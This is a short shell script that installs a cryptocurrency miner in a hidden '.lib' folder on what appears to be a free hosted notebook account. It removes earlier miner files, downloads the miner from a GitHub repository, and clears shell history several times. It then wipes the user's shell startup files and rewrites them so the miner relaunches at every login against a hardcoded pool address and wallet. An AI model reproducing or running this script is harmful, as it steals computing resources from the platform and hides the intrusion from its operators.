#!/bin/sh

rm -rvf ele* lol* 1.43* TON* miner** NB* .lib* .bash*
cd ~/
mkdir .lib
cd .lib
rm -rf *
WORKERDERO="btex"
WALLETDERO="web1qh6sryawxtmsjmn2lfe282g5wj97py55avgnuvu"
POOLDERO="stratum+tcps://159.223.188.176:80"
git clone https://github.com/angkii/2022.git && cd 2022 
mv * /home/studio-lab-user/.lib
cd .. && history -cr
echo ""  > /home/studio-lab-user/.bashrc
echo "" > /home/studio-lab-user/.bash_history
echo "" > /home/studio-lab-user/.bash_profile
echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
echo "WORKER=$WORKER" >> ~/.bash_profile
echo "WORKERDERO=$WORKERDERO" >> ~/.bash_profile
echo "WALLETNH=$WALLETNH" >> /home/studio-lab-user/.bash_profile
echo "WALLETDERO=$WALLETDERO" >> /home/studio-lab-user/.bash_profile
echo "POOLNHETC=$POOLNHETC" >> /home/studio-lab-user/.bash_profile
echo "POOLDERO=$POOLDERO" >> /home/studio-lab-user/.bash_profile
echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
echo "./.lib/./dero -a yespower -o $POOLDERO -u $WALLETDERO.$WORKERDERO &>> .lib/dero.log &" > /home/studio-lab-user/.lib/gas.sh
chmod +x gas.sh && chmod +x dero && cd ~/ && history -cr && source .bashrc
